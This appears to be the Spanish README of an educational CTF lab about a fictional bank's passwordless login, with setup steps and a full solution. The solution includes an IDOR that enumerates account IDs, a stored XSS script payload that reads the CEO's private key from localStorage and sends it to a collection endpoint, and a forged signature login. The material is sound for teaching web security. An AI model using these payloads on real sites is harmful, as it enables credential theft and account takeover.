# HackerBank — "Passwordless de Cartón"

Desafío CTF **educativo y ético** del **Hacking Day de Córdoba** sobre
autenticación **passwordless / FIDO2 / WebAuthn**. Banco ficticio; datos y
"código ganador" inventados; no procesa dinero real.

La app está en [`banco_app/`](banco_app/).

---

## INSTALACIÓN Y PUESTA EN MARCHA

### Requisitos
- **Docker** + Docker Compose (recomendado) y **Git**.

### Pasos (con Docker)

1. Clonar el repositorio y entrar a la carpeta de la app:
   ```bash
   git clone https://github.com/TomiiC73/HackingDay.git
   cd HackingDay/banco_app
   ```
2. Construir y levantar (la **primera vez tarda**: baja la imagen de Playwright
   con Chromium para el bot CEO):
   ```bash
   docker compose up -d --build
   ```
3. Abrir el desafío en el navegador: **http://localhost:5000**
4. Comandos útiles:
   ```bash
   docker compose logs -f      # ver logs (app + bot)
   docker compose restart      # resetear el entorno entre participantes
   docker compose down         # apagar
   ```

El contenedor corre solo: siembra la base, levanta la app y el **bot CEO**
(la "víctima" del XSS). La base se recrea limpia en cada arranque.

### Alternativa sin Docker (Python 3.10+)

```bash
cd banco_app
pip install -r requirements.txt
playwright install chromium        # navegador para el bot CEO
python seed.py                     # siembra la base (crea ceo_passkey.json)
python bot.py &                    # bot CEO (en segundo plano)
python app.py                      # levanta la app en el puerto 5000
```

---

## ENUNCIADO

HackerBank, una prestigiosa firma bancaria, presume de tener el login
passwordless más fortalecido del mundo: *"seguro como una passkey FIDO2, ni
nosotros podríamos robar la llave de un cliente"*. Te dieron una cuenta de
prueba para que lo pongas a prueba (usuario: **`t3ny`**, sin contraseña: entrás
con tu biometría). ¿Pero será tan inquebrantable como dicen? Tu objetivo es
**loguearte como el CEO** y llevarte el código que guarda en su cuenta.

> **Pista:** al CEO le encanta leer los mensajes de sus clientes.

---

## SOLUCIÓN

### CAPA 1 — Reconocimiento del flujo (Burp Suite)

1. Ingresar en `/login`, tipear el usuario **`t3ny`** y apretar el botón de la
   huella. Entrará en un dashboard de práctica.
2. Con Burp Suite, interceptar las peticiones, que son:
   - `POST /auth/register` → el navegador genera una passkey y registra **solo la clave pública**.
   - `POST /auth/challenge` → devuelve un `user_id` y un `challenge`.
   - `GET /auth/keys/<user_id>` → retorna un `credential_id`.
   - `POST /auth/verify` → inicia sesión (con los parámetros `credential_id`, `challenge` y una `signature`).
3. Con el usuario logueado se puede ver que la clave privada nunca viaja, pero
   se puede obtener con `localStorage.getItem("hb_privkey_t3ny")` desde la
   consola (F12 → Console).

### CAPA 2 — Obtener el `credential_id` del CEO

Para el `/verify` hace falta el `credential_id` del CEO. Ese dato lo filtra un
endpoint sin control de acceso.

1. Usando la petición `GET /auth/keys/7042` y enviándola al **Repeater** de Burp,
   cambiar el número hacia `7013`, `7025`, `7031`, `7058` hasta encontrar el que
   pertenece al CEO, para obtener su `credential_id`.
2. En esa misma petición está la clave pública, pero no se puede firmar porque
   falta la privada.

### CAPA 3 — Robar la clave privada al CEO

Existe un panel de bandeja llamado **"Mensajes al administrador"** donde se
pueden mandar mensajes al CEO y este los revisa. Esa bandeja **no está
sanitizada**, por lo que se puede inyectar código.

1. Con `t3ny` logueado, comprobar que hay **XSS** activo, por ejemplo mandando un
   `<b>hola</b>`.
2. Inyectar el siguiente payload para obtener la clave privada del CEO:

   ```html
   Hola, necesito ayuda con mi cuenta.
   <script>
   window.addEventListener("load", function () {
     var user = document.getElementById("nombre_usuario").innerText;
     if (user !== "t3ny") {                                    // el visitante es el CEO
       var priv = localStorage.getItem("hb_privkey_" + user); // su clave privada
       new Image().src = "/collect?data=" + encodeURIComponent(priv);
     }
   });
   </script>
   ```

3. Hay un botón para forzar al CEO a ver su bandeja de entrada (1 vez por
   minuto). El CEO entra a la bandeja y ejecuta el payload.
4. Luego de unos segundos, en `/collected` se mostrará la clave privada del CEO.

### CAPA 4 — Firmar el challenge del CEO y acceder

Con el `credential_id` del CEO (Capa 2) y la clave privada (Capa 3), solo falta
autenticarse: se pide un challenge fresco del CEO, se firma con la clave y se
manda el `verify`.

1. Existe una función en la consola (F12), `signChallenge(clavePrivada, challenge)`,
   que retorna el hex de la firma.
2. En el Repeater, con `POST /auth/verify` se ingresa:

   ```json
   {"username":"ceo","credential_id":"<del IDOR>","challenge":"<paso 1>","signature":"<hex del paso 2>"}
   ```

Finalmente se entra como el CEO y se muestra el código ganador.

---

El desafío enseña que se pudo robar la llave del CEO **solo porque estaba en
`localStorage`**, al alcance de JavaScript. En FIDO2 real la clave vive en el
**TPM/Secure Enclave** y el navegador nunca puede leerla: el mismo XSS no habría
robado nada. El *"passwordless fortalecido"* era de cartón.
